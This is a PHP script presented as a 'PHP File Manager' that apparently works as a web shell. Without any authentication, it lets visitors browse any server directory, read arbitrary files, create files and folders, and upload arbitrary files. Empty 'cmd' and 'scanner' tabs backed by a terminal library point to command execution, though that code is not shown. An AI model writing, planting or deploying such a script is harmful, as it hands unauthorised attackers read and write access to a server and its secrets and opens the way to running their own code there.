<?php
ini_set('log_errors', 1);
ini_set('display_errors', 0);

function setCookieDir($dir) {
    setcookie('current_dir', $dir, time() + 7200, '/'); // Set cookie for 2 hours
}

function getCookieDir() {
    return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
}

function sanitizePath($path) {
    $path = str_replace("\\", DIRECTORY_SEPARATOR, htmlspecialchars($path));
    $path = rtrim($path, DIRECTORY_SEPARATOR);
    return $path;
}

function path() {
    $dir = isset($_GET['dir']) ? sanitizePath($_GET['dir']) : getCookieDir();
    $dir = realpath($dir);
    
    if ($dir && is_dir($dir)) {
        chdir($dir);
        setCookieDir($dir);
    } else {
        $dir = getcwd();
    }

    return $dir;
}

function renderFileList($dir) {
    if (!is_dir($dir)) {
        return "<p>Directory not found: " . htmlspecialchars($dir) . "</p>";
    }

    function parentDir($dir) {
        return realpath(dirname($dir)) ?: $dir;
    }

    function getFileInfo($path) {
        return [
            'name' => basename($path),
            'path' => $path,
            'owner' => fileowner($path),
            'group' => filegroup($path),
            'perms' => substr(decoct(fileperms($path) & 0777), -3),
            'modification_date' => date("Y-m-d H:i:s", filemtime($path))
        ];
    }

    $items = array_diff(scandir($dir), ['.', '..']);
    $parentPath = ($dir !== DIRECTORY_SEPARATOR) ? parentDir($dir) : null;

    $directories = [];
    $files = [];

    if ($parentPath) {
        $directories[] = array_merge(getFileInfo($parentPath), [
            'type' => 'dir',
            'link' => "<a href='#' class='dir-link' data-dir='" . sanitizePath($parentPath) . "'>..</a>"
        ]);
    }

    foreach ($items as $item) {
        $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
        $info = array_merge(getFileInfo($itemPath), [
            'link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . sanitizePath($itemPath) . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . sanitizePath($itemPath) . "'>$item</a>"
        ]);

        if (is_dir($itemPath)) {
            $info['type'] = 'dir';
            $directories[] = $info;
        } elseif (is_file($itemPath)) {
            $info['type'] = 'file';
            $files[] = $info;
        }
    }

    $html = "<table class='table'><thead><tr><th>Name</th><th>Type</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Modification Date</th></tr></thead><tbody>";

    foreach ($directories as $dir) {
        $html .= "<tr><td>{$dir['link']}</td><td>Directory</td><td>{$dir['owner']}</td><td>{$dir['group']}</td><td>{$dir['perms']}</td><td>{$dir['modification_date']}</td></tr>";
    }

    foreach ($files as $file) {
        $html .= "<tr><td>{$file['link']}</td><td>File</td><td>{$file['owner']}</td><td>{$file['group']}</td><td>{$file['perms']} </td><td>{$file['modification_date']}</td></tr>";
    }

    $html .= "</tbody></table>";

    return $html;
}

$dir = path();

if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'create_folder':
            if (isset($_POST['folder_name'])) {
                $folderName = sanitizePath($_POST['folder_name']);
                $newFolderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
                if (!file_exists($newFolderPath)) {
                    mkdir($newFolderPath);
                } else {
                    echo "Folder already exists.";
                }
            }
            break;

        case 'create_file':
            if (isset($_POST['file_name'])) {
                $fileName = sanitizePath($_POST['file_name']);
                $newFilePath = $dir . DIRECTORY_SEPARATOR . $fileName;
                if (!file_exists($newFilePath)) {
                    touch($newFilePath);
                } else {
                    echo "File already exists.";
                }
            }
            break;

        case 'upload':
            if (isset($_FILES['upload_file'])) {
                $file = $_FILES['upload_file'];
                $targetFile = $dir . DIRECTORY_SEPARATOR . basename($file['name']);
                move_uploaded_file($file['tmp_name'], $targetFile);
            }
            break;

        case 'view':
            if (isset($_GET['file'])) {
                $file = sanitizePath($_GET['file']);
                if (file_exists($file)) {
                    $content = file_get_contents($file);
                    echo "<p>File Contents: " . htmlspecialchars($file) . "</p>";
                    echo '<pre>' . htmlspecialchars($content) . '</pre>';
                } else {
                    echo "<p>Unable to read file.</p>";
                }
            }
            break;
    }
    exit();
}

if (isset($_GET['dir'])) {
    echo renderFileList($dir);
    exit();
}

$fileListHtml = renderFileList($dir);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css"/>
    <style>
        /* Your existing CSS styles */
    </style>
</head>
<body>
<div class="container">
    <h2 class="text-center mb-4">PHP File Manager</h2>

    <div class="info-section mb-4">
        <div class="info-item">Info:</div>
        <div class="info-item">Info:</div>
        <div class="info-item">Current Directory : <span id="current-dir"><?php echo htmlspecialchars($dir); ?></span></div>
    </div>

    <div class="tab-content" id="pills-tabContent">
        <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
            <div id="file-list">
                <?php echo $fileListHtml; ?>
            </div>
        </div>
        <div class="tab-pane fade" id="cmd" role="tabpanel" aria-labelledby="cmd-tab">...</div>
        <div class="tab-pane fade" id="scanner" role="tabpanel" aria-labelledby="scanner-tab">...</div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    $(document).ready(function() {
        $(document).on('click', '.dir-link', function(event) {
            event.preventDefault();
            var dir = $(this).data('dir');
            $.get('?dir=' + encodeURIComponent(dir), function(data) {
                $('#file-list').html(data);
                $('#current-dir').text(dir);
            }).fail(function() {
                alert('Failed to load directory.');
            });
        });

        $(document).on('click', '.file-link', function(event) {
            event.preventDefault();
            var file = $(this).data('file');
            $.get('?action=view&file=' + encodeURIComponent(file), function(data) {
                alert(data);
            }).fail(function() {
                alert('Failed to load file.');
            });
        });
    });
</script>
</body>
</html>
